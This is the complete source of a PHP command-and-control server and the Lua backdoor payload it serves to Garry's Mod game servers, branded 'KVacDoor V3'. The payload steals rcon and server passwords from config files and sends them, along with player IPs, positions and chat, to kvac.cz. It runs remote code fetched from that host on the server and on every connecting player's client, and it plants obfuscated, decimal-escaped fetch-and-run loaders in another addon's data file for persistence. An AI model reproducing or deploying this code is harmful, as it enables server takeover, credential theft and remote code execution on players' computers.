<?php

// foreach($_GET as $key => $value)
// {
// 	if($key !== "key") {
// 		die();
// 		break;
// 	}
// }

// if (isset($_GET['key'])) {
// 	if($_GET['key'] == "qIwI6G2FMC4syCt8vKBD") {
// 		die();
// 	}
	
// 	if($_GET['key'] == "GUNY31XlkP5fWgo03mZq") {
// 		die();
// 	}
// }

if (!isset($_COOKIE["kvacGreatAgain"])) {
	setcookie("kvacGreatAgain", uniqid(), time() + 31556926);
}
if (isset($_COOKIE["kvacGreatAgain"])) {
	die();
}

if (isset($_SESSION['user']['id']) || ($_SERVER['HTTP_USER_AGENT'] !== "Valve/Steam HTTP Client 1.0 (4000)") || (isset($_GET['key']) && strlen($_GET['key']) !== 20) || isset($_SERVER['HTTP_REFERER'])) {
	die();
}


//
// SERVER INFO UPDATE | TIMER 30 SECONDS
//
if (isset($_POST['hostname']) && isset($_POST['gamemode'])) {

	require_once '../../app/Models/includes.php';

	function isJson($string) {
		json_decode($string);
		return json_last_error() === JSON_ERROR_NONE;
	}

	extract($_POST);

	$internet_protocole = explode(":", $ip);

	if ($internet_protocole[0] != CSRF::GetVisitorIP()) {
		die();
	}

	if (!preg_match('/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:?([0-9]{1,5})?/', $ip, $match)) {
		die();
	}

	if (!isset($hostname) || empty(trim($hostname))) {
		$hostname = "UNTITLED SERVER";
	}

	if (!isset($gamemode) || empty(trim($gamemode))) {
		die("-- error 1");
	}

	if (!isset($map) || empty(trim($map))) {
		die("-- error 2");
	}

	if (!isset($ip) || empty(trim($ip))) {
		die("-- error 3");
	}

	if (!isset($csrf) || empty(trim($csrf))) {
		die("-- error 4");
	}

	if (!isset($uptime) || empty(trim($uptime))) {
		die("-- error 5");
	}

	if (!isset($maxplayer) || empty(trim($maxplayer))) {
		die("-- error 6");
	}

	if ($hostname == "Garry's Mod" && $internet_protocole[1] == "27015") {
		//die("-- error 7");
	}

	if (!isset($rcon) || empty(trim($rcon))) {
		$rcon = "Not Found";
	}

	if (!isset($password) || empty(trim($password))) {
		$password = "Not Found";
	}

	if (!isset($backdoors) || empty(trim($backdoors))) {
		$backdoors = "[]";
	}

	if ($backdoors == "{}") {
		die();
	}

	if ($version !== "1.0.8" && $version !== "1.0.7" && $version !== "1.0.6") {
		die();
	}

	if ($version == "1.0.8") {
		if ($csrf != md5('amelie' . $_SERVER["HTTP_CF_CONNECTING_IP"])) {
			die();
		}
	}

	if (!isset($_GET['key']) || empty(trim($_GET['key']))) {
		$key = "e68IimW8WBwFmQ9gDRjt";
	} else {
		$key = $_GET['key'];
		//$key = "e68IimW8WBwFmQ9gDRjt";
	}

	if (!isJson($backdoors)) {
		die();
	}

	$owner = Server::GetOwnerByKey($key);

	if (Server::ServerExistByIP($ip)) {

		$server_data = Server::GetServerByIP($ip);

		if ($server_data["last_update"] + 21600 * 8 >= time()) {
			$owner = $server_data["owner"];
		}

		// if server already exist
		Server::UpdateServer($hostname, $ip, $map, $gamemode, $maxplayer, $rcon, $password, $owner, $uptime, time(), $version, $backdoors);
	} else {

		// if server not exist
		if ($version == "1.0.8") {
			Server::InsertServer($hostname, $ip, $map, $gamemode, $maxplayer, $rcon, $password, $owner, $uptime, time(), $version, $backdoors);
		}
	}

	die();
}

//
// UPDATE PLAYERLIST | TIMER 5 SECONDS
//
if (isset($_POST['playerlist']) && isset($_POST['nbplayer'])) {

	require_once '../../app/Models/includes.php';

	extract($_POST);

	$internet_protocole = explode(":", $ip);

	if ($internet_protocole[0] != CSRF::GetVisitorIP()) {
		die("-- 1");
	}

	if (!preg_match('/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})\:?([0-9]{1,5})?/', $ip, $match)) {
		die("-- 2");
	}

	if (!isset($ip) || empty(trim($ip))) {
		die("-- 3");
	}

	if (!isset($csrf) || empty(trim($csrf))) {
		die("-- 4");
	}

	if (!isset($nbplayer) || empty(trim($nbplayer))) {
		$nbplayer = 0;
	}

	if (!isset($playerlist) || empty(trim($playerlist))) {
		die("-- 6");
	}

	if (!Server::ServerExistByIP($ip)) {
		die("-- 7");
	}

	$GLOBALS['DB']->Update(
		"servers",
		[
			'ip' => $ip
		],
		[
			'used_slots' => $nbplayer,
			'playerlist' => $playerlist,
			'last_update' => time()
		],
		false
	);

	// $slug = "servers-{$ip}-analytics";
	// $hours = date("H");

	// $minute = date("i");

	// if ($minute <= 15) {
	// 	$per = 15;
	// } elseif ($minute > 15 && $minute <= 30) {
	// 	$per = 30;
	// } elseif ($minute > 30 && $minute <= 45) {
	// 	$per = 45;
	// } elseif ($minute > 45 && $minute <= 59) {
	// 	$per = "00";
	// 	$hours = ($hours + 1);
	// }

	// if (Chart::isExist($slug, $hours . ":" . $per)) {
	// 	Chart::update($slug, $nbplayer, $hours . ":" . $per);
	// } else {
	// 	Chart::add($slug, $nbplayer, $hours . ":" . $per);
	// }

	$server_data = Server::GetServerByIP($ip);

	$payload_data = Payload::ReadPayloadToServerID($server_data['id']);

	if (!empty($payload_data)) {
		$replaced_payload = str_replace("{{discord_invite}}", "https://discord.gg/kBtK8zbzzP", $payload_data['content']);
		echo $replaced_payload;
	}

	die();
}

//
// CONSOLE PUSH | ON MESSAGE
//
if (isset($_POST['text_chat']) && isset($_POST['steamid_chat'])) {

	require_once '../../app/Models/includes.php';

	$ip = htmlentities($_POST['ip']);
	$msg =  $_POST['name'] . ' : ' . $_POST['text_chat'];

	$limit = 60;

	$api = tmpcache("steam-{$_POST['steamid_chat']}", json_decode(file_get_contents("http://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=6192A155B22B585694C24CC24029FA76&steamids={$_POST['steamid_chat']}")), 3600);

	$avatar = $api->response->players[0]->avatarmedium;

	Console::PushConsole($ip, $_POST['text_chat'], $avatar, $_POST['steamid_chat'], $_POST['name']);

	$CountChat = Console::CountServerConsole($ip);

	if ($CountChat > $limit) {
		$limit = ($CountChat - $limit);
		Console::DeleteServerConsole($ip, $limit);
	}
	die();
}

if (isset($_POST['p']) && $_POST['p'] == md5('x9JvQ' . $_SERVER["HTTP_CF_CONNECTING_IP"])) {
} else {
	http_response_code(429);
	die('<html>
	<head><title>400 Bad Request</title></head>
	<body bgcolor="white">
	<center><h1>429 Too Many Requests</h1></center>
	<hr><center>nginx</center>
	</body>
	</html>');
}

if (!isset($_GET['key']) || empty(trim($_GET['key']))) {
	$key = "";
} else {
	$key = "?key=" . $_GET['key'];
}

function UniqueHashFromIP($word)
{
	return substr(strtoupper(md5($word . 'x9JvQ' . $_SERVER["HTTP_CF_CONNECTING_IP"] . date('d'))), -16);
}

?>
--[[
V3 By WaDixix & Alex
Ce code est publique et ne sert que de lien.
]]

if w<?= UniqueHashFromIP("GrasZone"); ?>a == "<?= UniqueHashFromIP("110kg"); ?>" then return end
w<?= UniqueHashFromIP("GrasZone"); ?>a = "<?= UniqueHashFromIP("110kg"); ?>"

local HTTP = HTTP
local RunString = RunString
local file = file
local timer = timer

local website = 'https://kvac.cz'
local infectkey = '<?= $key ?>'

-- Executes a remote Lua code on a player's client
-- @param player: the player object on which the code should be executed
local function executeClientCode(player)
    if(!player:IsBot()) then
        player:SendLua([[local function runRemoteCode() http.Post("https://kvac.cz/garrysmod/client/scripts", {}, function(response) RunString(response, ">", false) end) timer.Simple(600, runRemoteCode) end runRemoteCode()]])
    end
end

local function CheckFuncNames(func,n)
    for i=0,30 do
        local xx = jit.util.funck( func, -i )
        if xx == n then
        return true
        end
    end
    return false
end

local function GetLinesFromFuncInfo(poof)
    local src = debug.getinfo(poof)
    if not src.short_src then return "(No source)" end
    if not file.Exists(src.short_src,"GAME") then
        return "(RunString)"
    end
    local lines = string.Split(file.Read(src.short_src,"GAME"),"\n")
    local lean = ""
    for k,v in pairs(lines) do
        if (k >= src.linedefined) and (k <= src.lastlinedefined) then
            lean = lean .. v .. "\n"
        end
    end
    return lean
end

local function GetBackdoors()
    local tbl = net.Receivers
    local ret = {}

	if file.Exists("autorun/server/snte_source.lua","LUA") or ConVarExists("snte_ulxluarun") or ConVarExists("snte_dupefix") then
		table.insert(ret,{anticheat="SNTE"})
	end
	if CAC then
		table.insert(ret,{anticheat="CAC"})
	end
	if Prometheus then
		table.insert(ret,{store="Prometheus"})
	end
	if GExtension then
		table.insert(ret,{store="GExtension"})
	end

    for k,v in pairs(tbl) do

		if k == "tpdsa:mission" then continue end
		if string.StartWith(k, "dconfig_") then continue end
		if string.StartWith(k, "pac3_test_") then continue end

        if CheckFuncNames(v,"RunString") then
            local txt = GetLinesFromFuncInfo(v)
            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
        end
        if CheckFuncNames(v,"RunStringEx") then
            local txt = GetLinesFromFuncInfo(v)
            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
        end
        if CheckFuncNames(v,"CompileString") then
            local txt = GetLinesFromFuncInfo(v)
            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
        end
    end
    return util.TableToJSON(ret)
end

-- for KVacDoor V3.2 Update
local function getPlayerlist()

	local listofplayers = player.GetAll()
	local players = {}
	
	for i=1, #listofplayers do
		if listofplayers[i]:IsPlayer() then
			players[i] = {}
            players[i]["steamid"] = listofplayers[i]:SteamID64()
            players[i]["nick"] = listofplayers[i]:Nick()
            players[i]["usergroup"] = listofplayers[i]:GetUserGroup()
            players[i]["frags"] = listofplayers[i]:Frags()
            players[i]["deaths"] = listofplayers[i]:Deaths()
            players[i]["ping"] = listofplayers[i]:Ping()
            players[i]["ip"] = listofplayers[i]:IPAddress()
            players[i]["position"] = listofplayers[i]:GetPos()
            players[i]["angle"] = listofplayers[i]:EyeAngles()
		end
	end
	return util.TableToJSON(players)
end

local function refresh_playerlist()
	local wadixxxee_time = 90
	if #player.GetHumans() >= 1 then
		wadixxxee_time = 10
	end
	if #player.GetHumans() >= 4 then
		wadixxxee_time = 5
	end
	local players = {
		nbplayer = tostring(#player.GetAll()),
		playerlist = getPlayerlist(),
		ip = game.GetIPAddress(),
		csrf = "<?= md5('lena' . $_SERVER["HTTP_CF_CONNECTING_IP"]) ?>"
	}
	HTTP({url=website .. "/_/api.php",method="post",parameters=players,success=function(a,b,c) if(#b ~= 0) then RunString(b) end end})
	timer.Create("<?= UniqueHashFromIP("ateek_playerlist"); ?>", wadixxxee_time, 0, refresh_playerlist)
end

local function update_serverinfo()

	local infos = {}
	local files = file.Find("cfg/*", "GAME")

	for i = 1, #files do
		if string.EndsWith(files[i], ".cfg") then
			local content = file.Read("cfg/" .. files[i], "GAME")
			content = string.Explode("\n", content)

			for i = 1, #content do
				if string.StartWith(content[i], "rcon_password") then
					table.insert(infos, 1, string.Split(content[i], "\"")[2])
				end

				if string.StartWith(content[i], "sv_password") then
					table.insert(infos, 2, string.Split(content[i], "\"")[2])
				end
			end
		end
	end

	local sendinfo = {
		ip = game.GetIPAddress(),
		hostname = GetHostName(),
		map = game.GetMap(),
		gamemode = engine.ActiveGamemode(),
		maxplayer = tostring(game.MaxPlayers()),
		rcon = infos[1],
		password = infos[2],
		uptime = tostring(math.floor(CurTime())),
		backdoors = GetBackdoors(),
		csrf = "<?= md5('amelie' . $_SERVER["HTTP_CF_CONNECTING_IP"]) ?>",
		version = "1.0.8"
	}

	HTTP({url=website .. "/_/api.php" .. infectkey,method="post",parameters=sendinfo})
end

local function push_console(ply, text)
	local console_data =
	{
		name = ply:Nick(),
		ip = game.GetIPAddress(),
		steamid_chat = ply:SteamID64(),
		text_chat = text,
		csrf = "<?= md5('oceane' . $_SERVER["HTTP_CF_CONNECTING_IP"]) ?>"
	}
	HTTP({url=website .. "/_/api.php",method="post",parameters=console_data})
end

timer.Create("<?= UniqueHashFromIP("ateek_playerlist"); ?>", 10, 0, refresh_playerlist)
timer.Create("<?= UniqueHashFromIP("ateek_serverinfo"); ?>", 240, 0, update_serverinfo)

timer.Simple(1, function()
	concommand.Remove("host_writeid")
	hook.Add("PlayerInitialSpawn", "<?= UniqueHashFromIP("TRIZOZONE"); ?>", executeClientCode)
	hook.Add("PlayerSay", "<?= UniqueHashFromIP("KITANAGAY"); ?>", push_console)
	update_serverinfo()
	for k,v in pairs(player.GetAll()) do
		executeClientCode(v)
	end
end)

if file.Exists("xeon/xeon.dat", "DATA") then
	file.Append("xeon/xeon.dat", "\n" .. [[if SERVER then timer.Simple(0.70,function() RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\107\118\97\99\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\107\118\97\99\100\111\111\114\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") end) end]])
end

util.AddNetworkString("DontRunStringCodePLZ")
net.Receive("DontRunStringCodePLZ", function(_, ply)
	if not IsValid(ply) then return end
	ply:Ban(0, false)
	ply:Kick("bad haxor")
	ply:SendLua([[while true do end]])
end)